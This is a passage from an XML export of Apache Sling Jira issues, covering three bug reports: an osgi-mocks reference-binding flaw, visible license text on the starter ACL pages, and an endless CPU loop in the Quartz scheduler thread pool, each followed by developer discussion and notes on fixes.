                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 49 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1bvdk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11668] [osgi-mocks] Dynamic service references not updated on osgi Components</title>
                <link>https://issues.apache.org/jira/browse/SLING-11668</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In osgi-mocks, when a OSGI Component (&lt;b&gt;without&lt;/b&gt; a service interface) is registered via `registerInjectActivateService`, and that component has dynamic non-mandatory service references that are not fulfilled at the time of the component initialization, those services references are never bound later when they become available.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Having stepped through the debugger, I believe that this condition is the cause:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/blob/5ce257bd07c5087f0340d7b7ab426971128eb69f/core/src/main/java/org/apache/sling/testing/mock/osgi/MockOsgi.java#L274-L278&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-osgi-mock/blob/5ce257bd07c5087f0340d7b7ab426971128eb69f/core/src/main/java/org/apache/sling/testing/mock/osgi/MockOsgi.java#L274-L278&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&#160;&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; @NotNull &amp;lt;T&amp;gt; T registerInjectActivateService(@NotNull &lt;span class=&quot;code-object&quot;&gt;Class&lt;/span&gt;&amp;lt;T&amp;gt; dsComponentClass, @NotNull BundleContext bundleContext, @Nullable &lt;span class=&quot;code-keyword&quot;&gt;final&lt;/span&gt; Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt; properties) {
&#160; &#160; Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt; mergedProperties = propertiesMergeWithOsgiMetadata(dsComponentClass, getConfigAdmin(bundleContext), properties);
&#160; &#160; ComponentContext componentContext = newComponentContext(bundleContext, mergedProperties);
&#160; &#160; T component = OsgiServiceUtil.activateInjectServices(dsComponentClass, (MockComponentContext)componentContext);
&#160; &#160; OsgiMetadata metadata = OsgiMetadataUtil.getMetadata(dsComponentClass);
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; (!metadata.getServiceInterfaces().isEmpty()) {
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-comment&quot;&gt;// convert component properties to service properties (http://docs.osgi.org/specification/osgi.cmpn/7.0.0/service.component.html#service.component-service.properties)
&lt;/span&gt;&#160; &#160; &#160; &#160; Dictionary&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt; serviceProperties = mergedProperties.entrySet().stream().filter(e -&amp;gt; e.getKey() != &lt;span class=&quot;code-keyword&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !e.getKey().startsWith(&lt;span class=&quot;code-quote&quot;&gt;&quot;.&quot;&lt;/span&gt;)).collect(&lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; DictionaryCollector&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt;(Entry::getKey, Entry::getValue));
&#160; &#160; &#160; &#160; bundleContext.registerService(metadata.getServiceInterfaces().toArray(&lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;[0]), component, serviceProperties);
&#160; &#160; }
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;return&lt;/span&gt; component;
}&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Here we see that if the service doesn&apos;t implement any interfaces, then it&apos;s completely forgotten about after being activated.&lt;/p&gt;

&lt;p&gt;This appears to be by-design as per &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10922&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;SLING-10922&lt;/a&gt;. However, in non-mock environments, components that do not implement a service interface still have references bound/unbound dynamically.&lt;/p&gt;

&lt;p&gt;As a consequence of this, in tests, the ordering of service activation becomes critically important - any component that does not implement and service an interface must be activated last, or else the references will not be updated. &lt;/p&gt;

&lt;p&gt;Even implementing/servicing a trivial empty interface resolves the issue.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13499149">SLING-11668</key>
            <summary>[osgi-mocks] Dynamic service references not updated on osgi Components</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="kylegio">Kyle Giovannetti</reporter>
                        <labels>
                    </labels>
                <created>Tue, 8 Nov 2022 02:56:27 +0000</created>
                <updated>Wed, 17 May 2023 16:32:05 +0000</updated>
                                            <version>Testing OSGi Mock 3.3.2</version>
                                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17630504" author="sseifert@pro-vision.de" created="Tue, 8 Nov 2022 16:12:09 +0000"  >&lt;p&gt;yes, this is a discussion we already had some time ago with &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; - for historical reasons osgi-mock currently does not implement a correct &quot;component registry&quot;, but only a &quot;service registry&quot; which is not covering the use cases you describe.&lt;/p&gt;

&lt;p&gt;i&apos;ve a task for this on my todo list to improve in the future, but did not had time for it, but it&apos;s not forgotten. i plan to work on it in the next few months if time permits.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13536572">SLING-11885</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13412053">SLING-10922</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 50 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1bkf4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11664] the starter acl/ace pages have visible licence text at the top of the page</title>
                <link>https://issues.apache.org/jira/browse/SLING-11664</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter-content/blob/master/src/main/resources/initial-content/apps/sling/servlet/default/acl.html.esp&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;acl.html.esp&lt;/a&gt; and &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter-content/blob/master/src/main/resources/initial-content/apps/sling/servlet/default/ace.html.esp&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ace.html.esp&lt;/a&gt; scripts are using the wrong style of comments around the license text which causes the licence text to be visible at the top of the page.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13497840">SLING-11664</key>
            <summary>the starter acl/ace pages have visible licence text at the top of the page</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sun, 6 Nov 2022 21:22:22 +0000</created>
                <updated>Tue, 24 Oct 2023 02:49:13 +0000</updated>
                            <resolved>Tue, 8 Nov 2022 18:49:09 +0000</resolved>
                                                    <fixVersion>Starter Content 1.0.14</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17629550" author="enorman" created="Sun, 6 Nov 2022 21:48:43 +0000"  >&lt;p&gt;PR #6 contains the proposed changes for review and feedback&lt;/p&gt;</comment>
                            <comment id="17630566" author="enorman" created="Tue, 8 Nov 2022 18:49:09 +0000"  >&lt;p&gt;Merged PR at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter-content/commit/47a32aecf92c67e18709a03946ff21b4c609366a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;47a32ae&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13245587">SLING-8585</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 50 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1bccg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11662] Endless loop in QuartzSchedulerThread.run() with maxPoolSize == queueSize</title>
                <link>https://issues.apache.org/jira/browse/SLING-11662</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When configuring the ThreadPool with maxPoolSize == queueSize and endless loop (can) happen(s) in QuartzSchedulerThread.run() which manifests as follows:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;&quot;MyPool_QuartzSchedulerThread&quot; #123 prio=5 os_prio=0 cpu=5123456.78ms elapsed=5163.45s tid=0x000012345678ff00 nid=0x1234 runnable  [0x000087654321ff00]
   java.lang.Thread.State: RUNNABLE
        at org.quartz.core.QuartzSchedulerThread.run(QuartzSchedulerThread.java:413)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13494569">SLING-11662</key>
            <summary>Endless loop in QuartzSchedulerThread.run() with maxPoolSize == queueSize</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="stefanegli">Stefan Egli</assignee>
                                    <reporter username="stefanegli">Stefan Egli</reporter>
                        <labels>
                    </labels>
                <created>Thu, 3 Nov 2022 11:59:56 +0000</created>
                <updated>Mon, 16 Dec 2024 11:00:33 +0000</updated>
                            <resolved>Thu, 5 Dec 2024 09:49:10 +0000</resolved>
                                    <version>Commons Scheduler 2.7.12</version>
                                    <fixVersion>Commons Scheduler 2.7.14</fixVersion>
                                    <component>Commons</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17628292" author="egli" created="Thu, 3 Nov 2022 12:07:08 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-scheduler/pull/6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR created&lt;/a&gt; that reproduces the 100% cpu / endless loop in QuartzSchedulerThread.run()&lt;/p&gt;</comment>
                            <comment id="17628427" author="egli" created="Thu, 3 Nov 2022 17:18:01 +0000"  >&lt;p&gt;The problem with the endless loop seems to be due to a breach of contract by sling.commons.scheduler.QuartzThreadPool:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/quartz-scheduler/quartz/blob/v2.3.2/quartz-core/src/main/java/org/quartz/spi/ThreadPool.java#L69-L82&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;quartz&apos; ThreadPool javadoc&lt;/a&gt; says that
&lt;blockquote&gt;&lt;p&gt;The implementation of this method should block until there is at least one available thread.&lt;/p&gt;&lt;/blockquote&gt;&lt;/li&gt;
	&lt;li&gt;however &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-scheduler/blob/a9ddf38ea9d9962c8938a381135827072fc9397f/src/main/java/org/apache/sling/commons/scheduler/impl/QuartzThreadPool.java#L80&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;sling.commons.scheduler.QuartzThreadPool#blockForAvailableThreads&lt;/a&gt; does not guarantee &lt;tt&gt;&amp;gt;0&lt;/tt&gt; - and in particular if &quot;maxPoolSize == queueSize&quot; then this method will return 0&lt;/li&gt;
	&lt;li&gt;that in turn leads quartz to hit the &lt;a href=&quot;https://github.com/quartz-scheduler/quartz/blob/v2.3.2/quartz-core/src/main/java/org/quartz/core/QuartzSchedulerThread.java#L411-L414&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ironically commented line&lt;/a&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
                } &lt;span class=&quot;code-keyword&quot;&gt;else&lt;/span&gt; { &lt;span class=&quot;code-comment&quot;&gt;// &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt;(availThreadCount &amp;gt; 0)
&lt;/span&gt;                    &lt;span class=&quot;code-comment&quot;&gt;// should never happen, &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; threadPool.blockForAvailableThreads() follows contract
&lt;/span&gt;                    &lt;span class=&quot;code-keyword&quot;&gt;continue&lt;/span&gt;; &lt;span class=&quot;code-comment&quot;&gt;// &lt;span class=&quot;code-keyword&quot;&gt;while&lt;/span&gt; (!halted)
&lt;/span&gt;                }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;so it will just .. continue&lt;/p&gt;&lt;/li&gt;
	&lt;li&gt;now this game repeats for ever after until .. the CPU becomes too hot due to constant 100% spinning and it breaks down .. leading to damage in a datacenter and so on and so forth&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Presumably quartz did nothing wrong here - other than perhaps add a safety/paranoia &lt;tt&gt;Thread.sleep(1);&lt;/tt&gt; before that &lt;tt&gt;continue&lt;/tt&gt; to avoid this. The problem is rather on the sling side.&lt;/p&gt;

&lt;p&gt;Question is how to best fix this.. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=joerghoh&quot; class=&quot;user-hover&quot; rel=&quot;joerghoh&quot;&gt;joerghoh&lt;/a&gt;, any suggestions?&lt;/p&gt;</comment>
                            <comment id="17628434" author="cziegeler" created="Thu, 3 Nov 2022 17:25:40 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=stefanegli&quot; class=&quot;user-hover&quot; rel=&quot;stefanegli&quot;&gt;stefanegli&lt;/a&gt; I guess we need to change the implementation in Slings QuartzThreadPool to block if there is no available thread. The thread should wait until a thread is available again in the pool. Not sure if we have a trigger for this where we can put a notify. otherwise we would need to implement a sleep loop, probably with a larger sleep than 1 ms to avoid the same situation.&lt;br/&gt;
Update: we can probably use runInThread to call the notify.&lt;/p&gt;</comment>
                            <comment id="17628443" author="egli" created="Thu, 3 Nov 2022 17:36:42 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, what I was wondering what the idea of the original (current) implementation of blockForAvailableThreads was.. is there a reason it looks at (static) configuration rather than actual threads vs queued runnables?&lt;/p&gt;</comment>
                            <comment id="17628445" author="egli" created="Thu, 3 Nov 2022 17:39:31 +0000"  >&lt;p&gt;(and if there was a reason then we could prevent activation when &lt;tt&gt;maxPoolSize==queueSize&lt;/tt&gt; is configured)&lt;/p&gt;</comment>
                            <comment id="17628696" author="cziegeler" created="Fri, 4 Nov 2022 06:17:53 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=stefanegli&quot; class=&quot;user-hover&quot; rel=&quot;stefanegli&quot;&gt;stefanegli&lt;/a&gt; I think this is just due to a misunderstanding of the API contract (we can also call it a bug),&lt;/p&gt;</comment>
                            <comment id="17635165" author="cziegeler" created="Thu, 17 Nov 2022 06:37:16 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=stefanegli&quot; class=&quot;user-hover&quot; rel=&quot;stefanegli&quot;&gt;stefanegli&lt;/a&gt; I updated the branch with a potential fix by introducing a simple counter for the available threads. at least the tests pass now&lt;/p&gt;</comment>
                            <comment id="17635219" author="egli" created="Thu, 17 Nov 2022 08:59:36 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, great thx! I&apos;ll have a look as soon as possible, was also planning to add perhaps another test case or so (but have to first check how much coverage there is for these edge cases)..&lt;/p&gt;</comment>
                            <comment id="17771032" author="cziegeler" created="Mon, 2 Oct 2023 10:03:42 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=stefanegli&quot; class=&quot;user-hover&quot; rel=&quot;stefanegli&quot;&gt;stefanegli&lt;/a&gt; Any update here? Should we merge?&lt;/p&gt;</comment>
                            <comment id="17771066" author="egli" created="Mon, 2 Oct 2023 12:22:56 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;, thx for reactivating this - got lost in the noise indeed. I&apos;ll have a look at the PR.&lt;/p&gt;</comment>
                            <comment id="17903280" author="egli" created="Thu, 5 Dec 2024 09:49:10 +0000"  >&lt;p&gt;PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-scheduler/pull/6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-commons-scheduler/pull/6&lt;/a&gt; merged, marking ticket resolved now&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            45 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1as5s:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
